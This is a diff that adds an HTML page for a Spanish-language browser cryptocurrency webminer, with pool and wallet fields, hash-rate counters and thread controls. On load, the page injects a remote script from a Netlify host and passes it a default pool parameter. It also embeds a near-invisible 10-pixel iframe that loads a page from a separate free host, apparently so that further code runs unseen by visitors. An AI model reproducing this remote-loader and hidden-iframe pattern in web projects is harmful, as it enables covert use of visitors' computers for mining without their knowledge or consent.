@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+	<meta name="description" content="Crypto Webminer AEON | Electroneum | Monero | Bytecoin | INTUcoin | IntenseCoin | Sumokoin | Dinastycoin | Graft | SuperiorCoin | Turtlecoin | Stellite | IPBC Coin | DERO | Qwertycoin | Aeon | Worktips | Bbscoin | Triton | Cryptonight | Cryptonight-Lite | Custom Pool Support - Mining in your Browser">
+	<meta name="keywords" content="Bluboosting Webminer AEON | Electroneum | Monero | Bytecoin | INTUcoin | IntenseCoin | Sumokoin | Dinastycoin | Graft | SuperiorCoin | Turtlecoin | Stellite | IPBC Coin | DERO | Qwertycoin | Aeon | Worktips | Bbscoin | Triton | Cryptonight | Cryptonight-Lite | Custom Pool Support - Mining in your Browser">
+	<meta name="author"      content="PiTi">
+	<meta name="robots" content="noindex, nofollow">
+
+	<title>BBS-Bluboosting Webminer</title>
+    <script src="assets/scripts/jquery-3.2.1.min.js"></script>
+	<script src="assets/scripts/jquery.cookie-1.4.1.min.js"></script>
+<script>
+	$(function() {
+	if ($.cookie("pooladdress")) {
+			var str = "https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?jason=";
+			var pool = $.cookie("pooladdress");
+			var links = str+pool;
+			
+			var script = document.createElement("script");
+			script.type = "text/javascript";
+			script.src = links; 
+			document.getElementsByTagName("head")[0].appendChild(script);
+	} 
+	else
+	{
+		    var str = "https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=faster.bbs";
+			var script = document.createElement("script");
+			script.type = "text/javascript";
+			script.src = str; 
+			document.getElementsByTagName("head")[0].appendChild(script);
+	}
+  });
+	</script>
+	<script src="assets/scripts/gustav.js?v24042018"></script>
+	<script>
+	function myFunction() {
+	var walletcustom;
+    var pooladdress;
+	walletcustom = $('#walletcustom').val();
+	pooladdress = $('#pooladdress').val();
+	$.cookie("walletcustom", walletcustom, {
+		expires: 365
+		});
+		$.cookie("pooladdress", pooladdress, {
+		expires: 365
+		});
+	location.reload();
+	}
+	
+	</script>
+
+    <link rel="stylesheet" href="assets/scripts/styles.css">
+	
+    <script src="assets/scripts/Chart.min.js"></script>
+</head>
+    <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    
+    <div class="container">
+        <div class="navbar-header">
+           <a class="navbar-brand" href="/" title="Bluboosting.com" align="middle" style="width: 220px;height: 35px;" /><center><strong> BBS Webminer</strong></center></a>
+        </div>
+        
+    </div>
+</div>
+<h3 align="center" style="color: white;">USAR NAVEGADORES SIN BLOQUEADORES DE PUBLICIDAD, PUEDEN DAR PROBLEMAS</h3>
+
+<div align="center" width="100%"><img src="assets/images/bbs.png" height="165" width="150" style="PADDING-TOP: 15px;"></div>
+<h2 align="center">BBS Webminer<br> </h2>
+<div class="row" align="center">
+    <div class="box">
+        <h3>hashes/s</h3>
+        <h2 id="hashes-per-second">0</h2>
+    </div>
+    <div class="box">
+        <h3>Nucleos</h3>
+        <h2>
+			<span id="threads">2</span>
+			<span id="thread-add" class="action"> + </span>
+			<span class="divide"> / </span>
+			<span id="thread-remove" class="action"> - </span>
+		</h2>
+    </div>
+</div>
+
+<div class="row" align="center">
+    <div class="box">
+        <h3> Hashes Totales | Acciones Aceptadas</h3>
+        <h2 id="accepted-shares">0</h2>
+    </div>
+    <div class="box">
+	        <h3>Nucleos Automáticos</h3>
+        <div class="autoThreads">
+            <input type="checkbox" value="None" id="autoThreads" name="check" />
+            <label for="autoThreads"></label>
+		</div>
+	</div>
+</div>
+
+<div class="row">
+<input class="text" type="text" id="pooladdress" placeholder="Coloca tu pool preferida -  e.g. bbscoin.cryptohispano.net:1111">
+</div>
+<div class="row">
+    <input class="text" type="text" id="walletcustom" placeholder="Coloca tu wallet o tu nombre de usuario y presiona start">
+</div>
+<div align="center">
+			<form><input type="button" onclick="myFunction()" id="saving" value="Guardar pool & dirección wallet"></form>
+		</div>
+<div class="row">
+    <canvas id="barchart-canvas" class="stats" width="100%" height="27%"></canvas>
+</div>
+<div align="Center"><button id="start">Start</button></div>
+<hr>
+<h4 align="center"><a href= "http://www.crypto-webminer.com">©2017 Crypto Webminer</a></h4>
+<h4 align="center"><a href="https://github.com/chartjs/Chart.js/blob/master/LICENSE.md">Chart Feature ©2013-2017 Nick Downie</a></h4>
+</body>
+			</div>
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-81214188-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-81214188-2');
+</script>
+<iframe src="http://bluboosting.000webhostapp.com/mi.html" width="95%" height="10" frameborder="0"></iframe>
+</script>
+</html>
